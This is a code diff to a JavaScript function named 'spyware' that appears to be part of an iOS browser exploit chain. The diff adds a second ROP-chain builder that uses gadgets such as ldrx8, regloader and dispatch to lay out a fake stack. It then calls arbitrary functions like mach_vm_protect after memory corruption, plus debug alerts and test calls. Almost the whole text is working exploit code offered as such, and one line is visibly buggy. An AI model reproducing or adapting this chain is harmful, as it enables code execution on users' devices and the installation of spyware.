@@ -361,6 +361,7 @@ function spyware(stage1, memory, binary)
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
     var stackloader         = gadgets["stackloader"];
+    var ldrx8               = gadgets["ldrx8"]; // might be undefined, then superb llvm gadgets are assumed
     var mach_task_self_     = memory.readInt64(syms["_mach_task_self_"]);
     // zero higher bytes
     mach_task_self_         = new Int64(mach_task_self_.bytes().map((v, i)=>i<4?v:0));
@@ -468,14 +469,8 @@ function spyware(stage1, memory, binary)
 
     var pos = arrsz - off;
 
-    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
-        x0 = x0 || Int64.Zero
-        x1 = x1 || Int64.Zero
-        x2 = x2 || Int64.Zero
-        x3 = x3 || Int64.Zero
-        x4 = x4 || Int64.Zero
-        jump_to = jump_to || stackloader
 
+    var add_call_llvm = function(func, x0, x1, x2, x3, x4, jump_to) {
         // in stackloader:
         arr[pos++] = 0xdead0010;                // unused
         arr[pos++] = 0xdead0011;                // unused
@@ -524,6 +519,99 @@ function spyware(stage1, memory, binary)
         arr[pos++] = jump_to.lo();              // x30 (gadget)
         arr[pos++] = jump_to.hi();              // x30 (gadget)
     }
+
+    var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
+        alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
+        // in stackloader:
+        arr[pos++] = 0xdead0010;                // unused
+        arr[pos++] = 0xdead0011;                // unused
+        arr[pos++] = 0xdead0012;                // unused
+        arr[pos++] = 0xdead0013;                // unused
+        arr[pos++] = 0xdead1101;                // x28 (unused)
+        arr[pos++] = 0xdead1102;                // x28 (unused)
+        arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
+        arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
+        arr[pos++] = 0xdead0016;                // x26 (unused)
+        arr[pos++] = 0xdead0017;                // x26 (unused)
+        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
+        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
+        arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
+        arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
+        arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
+        arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
+        arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
+        arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
+        arr[pos++] = func.lo();                 // x21 (target for dispatch)
+        arr[pos++] = func.hi();                 // x21 (target for dispatch)
+        arr[pos++] = 0xdead0018;                // x20 (unused)
+        arr[pos++] = 0xdead0019;                // x20 (unused)
+        arr[pos++] = Add(stack, pos*4).lo();    // x19 (scratch address for str x8, [x19])
+        arr[pos++] = Add(stack, pos*4).hi();    // x19 (scratch address for str x8, [x19])
+        arr[pos++] = 0xdead001c;                // x29 (unused)
+        arr[pos++] = 0xdead001d;                // x29 (unused)
+        arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+        arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+        // in ldrx8
+        arr[pos++] = dispatch.lo();             // x8 (target for regloader)
+        arr[pos++] = dispatch.hi();             // x8 (target for regloader)
+        arr[pos++] = 0xdead1401;                // (unused)
+        arr[pos++] = 0xdead1402;                // (unused)
+        arr[pos++] = 0xdead1301;                // x20 (unused)
+        arr[pos++] = 0xdead1302;                // x20 (unused)
+        arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
+        arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
+        arr[pos++] = 0xdead1201;                // x29 (unused)
+        arr[pos++] = 0xdead1202;                // x29 (unused)
+        arr[pos++] = regloader.lo();            // x30 (next gadget)
+        arr[pos++] = regloader.hi();            // x30 (next gadget)
+
+        // in regloader
+        // NOTE: REGLOADER DOES NOT ADJUST SP!
+        // FIXME: for some reason 0xbabe0000babe0000 is in x4 instead of
+        // expected value, and i have no fucking idea why
+        arr[pos++] = x4.lo();                   // x4 (arg4)
+        arr[pos++] = x4.lo();                   // x4 (arg4)
+
+        // after dispatch:
+        arr[pos++] = 0xdead0022;                // unused
+        arr[pos++] = 0xdead0023;                // unused
+        arr[pos++] = 0xdead0024;                // x22 (unused)
+        arr[pos++] = 0xdead0025;                // x22 (unused)
+        arr[pos++] = 0xdead0026;                // x21 (unused)
+        arr[pos++] = 0xdead0027;                // x21 (unused)
+        arr[pos++] = 0xdead0028;                // x20 (unused)
+        arr[pos++] = 0xdead0029;                // x20 (unused)
+        arr[pos++] = 0xdead002a;                // x19 (unused)
+        arr[pos++] = 0xdead002b;                // x19 (unused)
+        arr[pos++] = 0xdead002c;                // x29 (unused)
+        arr[pos++] = 0xdead002d;                // x29 (unused)
+        arr[pos++] = jump_to.lo();              // x30 (gadget)
+        arr[pos++] = jump_to.hi();              // x30 (gadget)
+    }
+
+    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
+        x0 = x0 || Int64.Zero
+        x1 = x1 || Int64.Zero
+        x2 = x2 || Int64.Zero
+        x3 = x3 || Int64.Zero
+        x4 = x4 || Int64.Zero
+        jump_to = jump_to || stackloader
+
+        return (ldrx8 ? add_call_via_x8 : add_call_llvm)(
+            func, x0, x1, x2, x3, x4, jump_to
+        )
+    }
+
+    add_call(mach_vm_protect);
+
+    add_call(new Int64(0x1244),
+        new Int64(0xcafe000fbabe000c),
+        new Int64(0xcafe010fbabe010c),
+        new Int64(0xcafe020fbabe010c),
+        new Int64(0xcafe030fbabe010c),
+        new Int64(0xcafe040fbabe010c)
+    );
 
     add_call(mach_vm_protect,
         mach_task_self_,    // task
